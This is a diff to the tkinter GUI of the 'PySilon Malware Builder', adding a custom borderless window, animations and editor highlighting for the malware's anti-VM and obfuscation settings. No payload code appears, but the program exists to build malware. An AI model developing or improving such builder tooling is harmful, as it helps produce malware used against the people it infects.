@@ -3,10 +3,13 @@ from tkinter import ttk
 import random
 import os
 import pyperclip
+import pyautogui
 import time
+import sys
+import ctypes
 import json
 import tkinter.font as tkFont
-from PIL import Image, ImageTk, ImageFont
+from PIL import Image, ImageTk, ImageFont, ImageGrab
 import requests
 
 with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
@@ -19,9 +22,13 @@ class Builder:
         self.master.title('PySilon Malware Builder')
         self.master.iconbitmap('resources/icons/default_icon.ico')
 
+        myappid = 'mycompany.myproduct.subproduct.version'
+        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
+
         try: self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
         except: self.malware_latest_version = None
 
+        self.create_header()
         self.create_navigation()
         #builder_configuration['window_sizes'][builder_configuration['use_sizes']]
         self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
@@ -117,7 +124,104 @@ class Builder:
             }
         }
 
+        if 'configuration.tmp' not in os.listdir('resources/assets'):
+            with open('resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
+                configuration_file.write(json.dumps(self.malware_configuration, indent=4))
+
         self.general_settings()
+
+    def start_move(self, event):
+        self.master.x = event.x
+        self.master.y = event.y
+
+    def stop_move(self, event):
+        self.master.x = None
+        self.master.y = None
+
+    def do_move(self, event):
+        dx = event.x - self.master.x
+        dy = event.y - self.master.y
+        x = self.master.winfo_x() + dx
+        y = self.master.winfo_y() + dy
+        self.master.geometry(f"+{x}+{y}")
+
+    def create_header(self):
+        self.header = tk.Canvas(self.master, bd=0, highlightthickness=0, bg='#191919')
+        self.header.place(
+            x=0, 
+            y=0, 
+            width=700, 
+            height=520)
+        
+        separator = tk.Frame(self.header, bg='#191919', height=1, width=700)
+        self.header.create_window(
+            0,
+            19,
+            window=separator, 
+            anchor='nw')
+
+        self.red_circle = tk.PhotoImage(file='resources/assets/builder_elements/red_circle.png')
+        self.close_button = tk.Button(
+            self.header,
+            text='',
+            image=self.red_circle,
+            bd=0,
+            cursor='hand2',
+            relief=tk.FLAT,
+            font=tkFont.Font(
+                family='Consolas', 
+                size=2),
+            disabledforeground='white',
+            command=self.exit_app
+            )
+        
+        self.header.create_window(
+            7,
+            5,
+            height=10,
+            width=10,
+            window=self.close_button, 
+            anchor='nw')
+        
+        self.yellow_circle = tk.PhotoImage(file='resources/assets/builder_elements/yellow_circle.png')
+        self.minimize_button = tk.Button(
+            self.header,
+            text='',
+            image=self.yellow_circle,
+            bd=0,
+            cursor='hand2',
+            relief=tk.FLAT,
+            font=tkFont.Font(
+                family='Consolas', 
+                size=2),
+            disabledforeground='white',
+            command=self.minimize_app
+            )
+        
+        self.header.create_window(
+            22,
+            5,
+            height=10,
+            width=10,
+            window=self.minimize_button, 
+            anchor='nw')
+        
+        self.header.create_text(
+            350,
+            10,
+            text='~ PySilon Malware Builder ~',
+            fill='grey',
+            font=(
+                'Consolas', 
+                11),
+            anchor=tk.CENTER
+        )
+        
+        self.header.bind("<ButtonPress-1>", self.start_move)
+        self.header.bind("<ButtonRelease-1>", self.stop_move)
+        self.header.bind("<B1-Motion>", self.do_move)
+
+        self.apply_rounded_corners('top')
 
     def new_background(self, demand=None):
         self.canvas.delete('all')
@@ -125,9 +229,12 @@ class Builder:
         if demand != None: selected_background = demand
         self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
         self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
+
+        self.apply_rounded_corners('bottom')
+        
         self.canvas.create_text(
-            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['hint_pos_x'], 
-            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['hint_pos_y'], 
+            10, 
+            452, 
             text='Hover on elements to get more info.', 
             fill='white', 
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['font_size']), 
@@ -173,18 +280,82 @@ class Builder:
                 'Consolas', 
                 builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['font_size']), 
             anchor=tk.NE)
+        
+    def exit_app(self):
+        for widgets in self.button_frame.winfo_children():
+            widgets.destroy()
+        self.button_frame.configure(background='#fe00ff')
+        self.header.delete('all')
+        self.header.configure(background='#fe00ff')
+        self.canvas.delete('all')
+
+        posx = self.master.winfo_x()
+        posy = self.master.winfo_y()+60
+        self.imgg = ImageGrab.grab(bbox=(posx, posy, posx+700, posy+460))
+        self.imgg = ImageTk.PhotoImage(self.imgg)
+        self.canvas.create_image(0, 0, image=self.imgg, anchor=tk.NW)
+
+        self.kf = ImageTk.PhotoImage(Image.open('resources/assets/builder_elements/transparency/' + str(builder_configuration['use_sizes']) + '/1.png'))
+        self.asd = self.canvas.create_image(0, 0, image=self.kf, anchor=tk.NW)
+        self.master.update()
+
+        for i in range(23):
+            self.canvas.delete(self.asd)
+            self.kf = ImageTk.PhotoImage(Image.open('resources/assets/builder_elements/transparency/' + str(builder_configuration['use_sizes']) + f'/{i+2}.png'))
+            self.asd = self.canvas.create_image(0, 0, image=self.kf, anchor=tk.NW)
+            self.master.update()
+
+        time.sleep(1)
+
+        sys.exit(0)
+
+    def minimize_root_threw(self, a):
+        self.master.unbind("<Map>")
+        self.master.overrideredirect(True)
+        size_y = 80
+        size_x = 0
+
+        for i in range(25):
+            size_x += 28
+            self.master.geometry(f'{size_x}x{size_y}')
+            self.master.update()
+
+        for i in range(22):
+            size_y += 20
+            self.master.geometry(f'{size_x}x{size_y}')
+            self.master.update()
+
+    def minimize_app(self):
+        size_y = 520
+        size_x = 700
+
+        for i in range(23):
+            size_y -= 20
+            self.master.geometry(f'{size_x}x{size_y}')
+            self.master.update()
+
+        for i in range(25):
+            size_x -= 28
+            self.master.geometry(f'{size_x}x{size_y}')
+            self.master.update()
+
+        self.master.bind("<Map>", self.minimize_root_threw)
+        self.master.state('withdrawn')
+        self.master.overrideredirect(False)
+        self.master.wm_state('iconic')
 
     def create_navigation(self):
-        self.button_frame = tk.Frame(self.master)
+        self.button_frame = tk.Frame(self.header)
         self.button_frame.place(
             x=0, 
-            y=0, 
+            y=20, 
             width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'], 
             height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['height'])
 
         self.general_settings_button = tk.Button(
             self.button_frame,
             text='General Settings',
+            cursor='hand2',
             font=tkFont.Font(
                 family='Consolas', 
                 size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
@@ -200,6 +371,7 @@ class Builder:
         self.functionality_settings_button = tk.Button(
             self.button_frame,
             text='Functionality Settings',
+            cursor='hand2',
             font=tkFont.Font(
                 family='Consolas', 
                 size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
@@ -215,6 +387,7 @@ class Builder:
         self.compiling_settings_button = tk.Button(
             self.button_frame,
             text='Compiling Settings',
+            cursor='hand2',
             font=tkFont.Font(
                 family='Consolas', 
                 size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
@@ -297,6 +470,14 @@ class Builder:
         if close != False:
             close.destroy()
 
+    def apply_rounded_corners(self, position):
+        if position == 'top':
+            self.corners_image2 = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_elements/corners2.png'))
+            self.header.create_image(0, 0, image=self.corners_image2, anchor=tk.NW)
+        elif position == 'bottom':
+            self.corners_image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_elements/corners.png'))
+            self.canvas.create_image(0, 440, image=self.corners_image, anchor=tk.NW)
+
     def load_configuration(self, temporary):
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
             self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
@@ -308,11 +489,12 @@ class Builder:
         if close != False:
             close.destroy()
 
-    def configuration_editor(self, file, highlight=['0.0', '1.0']):
+    def configuration_editor(self, file, highlight=['0.0', '1.0'], scroll='1.0'):
         cfg_editor = tk.Tk()
         cfg_editor.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width']) + 'x' + str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height']))
 
         cfg_editor.title('Configuration Editor')
+        cfg_editor.iconbitmap('resources/icons/default_icon.ico')
 
         frame = tk.Frame(cfg_editor)
         frame.place(
@@ -331,9 +513,9 @@ class Builder:
         with open(file, 'r', encoding='utf-8') as configuration_file:
             self.text.insert('1.0', ''.join(configuration_file.readlines()))
 
-        self.text.tag_add('highlight', '34.0', '38.0')
+        self.text.tag_add('highlight', highlight[0], highlight[1])
         self.text.tag_configure('highlight', background='#9effb8', foreground='black')
-        self.text.see(tk.END)
+        self.text.see(scroll)
 
         btn_savecfg = tk.Button(
             frame,
@@ -355,7 +537,9 @@ class Builder:
     def double_click_settings(self, context):
         if time.time() - self.time_check < 0.5:
             if context == 'antivm':
-                self.configuration_editor('resources/assets/configuration.tmp')
+                self.configuration_editor('resources/assets/configuration.tmp', ['75.0', '79.0'], '76.0')
+            elif context == 'obfuscation':
+                self.configuration_editor('resources/assets/configuration.tmp', ['34.0', '71.0'], '32.0')
         self.time_check = time.time()
 
     def open_pysilon(self):
@@ -365,9 +549,9 @@ class Builder:
         os.system('start https://github.com/mategol/PySilon-malware/releases')
     
     def show_tooltip(self, event, tooltip_text):
-        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
+        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10")
         self.tooltip_label.place(
-            x=0, 
+            x=10, 
             y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['pos_y'], 
             anchor=tk.SW)
 
@@ -423,6 +607,7 @@ class Builder:
         self.paste_token_button = tk.Button(
             self.canvas,
             image=self.paste_token_icon,
+            cursor='hand2',
             disabledforeground='white',
             relief='flat',
             width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['width'],
@@ -586,7 +771,7 @@ class Builder:
             builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_y'],
             window=self.implode_entry, 
             anchor='w')
-
+            
     def functionality_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
@@ -959,6 +1144,7 @@ class Builder:
                 'Consolas', 
                 builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
             variable=self.cbvar_obfuscation,
+            command=lambda:self.double_click_settings('obfuscation'),
             onvalue=True,
             offvalue=False
         )
@@ -1008,10 +1194,40 @@ class Builder:
 def main():
     global builder_configuration
     root = tk.Tk()
-    Builder(root)
-    root.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'])+'x'+str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['height']))
-    #root.wm_attributes('-transparentcolor', '#ab23ff')
+    #root.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'])+'x'+str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['height']))
+    
+    
+    root.wm_attributes('-transparentcolor', '#fe00ff')
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
     root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
+
+    sw = int(root.winfo_screenwidth()/2)
+    sh = int(root.winfo_screenheight()/2)
+    sizex = int(700/2)
+    sizey = int(520/2)
+
+    size_y = 80
+    size_x = 0
+    Builder(root)
+
+    for i in range(25):
+        size_x += 28
+        root.geometry(f'{size_x}x{size_y}+{sw-sizex}+{sh-sizey}')
+        root.update()
+
+    for i in range(23):
+        size_y += 20
+        root.geometry(f'{size_x}x{size_y}+{sw-sizex}+{sh-sizey}')
+        root.update()
+
+    
+    
+    
+    
+    root.geometry(f'700x520+{sw-sizex}+{sh-sizey}')
+    
+    
     root.mainloop()
 
 if __name__ == '__main__':
